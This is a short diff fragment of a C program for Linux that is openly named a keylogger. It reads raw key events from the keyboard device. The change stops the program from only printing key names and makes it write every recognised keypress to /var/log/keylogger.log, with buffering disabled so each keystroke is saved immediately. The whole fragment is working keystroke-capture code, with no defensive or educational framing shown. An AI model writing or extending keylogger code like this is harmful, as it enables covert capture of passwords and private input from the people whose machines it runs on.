@@ -55,18 +55,29 @@ int main() {
    int kbd_fd = openKeyboardDeviceFile();
    assert(kbd_fd > 0);
 
+   FILE *logfile = fopen("/var/log/keylogger.log", "a");
+   if (logfile == NULL) {
+      LOG_ERROR("Could not open log file");
+      exit(-1);
+   }
+
+   // We want to write to the file on every keypress, so disable buffering
+   setbuf(logfile, NULL);
+
    input_event event;
    while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
       if (event.type == EV_KEY) {
          if (event.value == 1) { // Key press
             char *name = getKeyText(event.code);
             if (strcmp(name, UNKNOWN_KEY) != 0) {
-               printf("%s\n", name);
+               LOG("%s", name);
+               fprintf(logfile, "%s", name);
             }
          }
       }
    }
 
+   fclose(logfile);
    close(kbd_fd);
    return 0;
 }
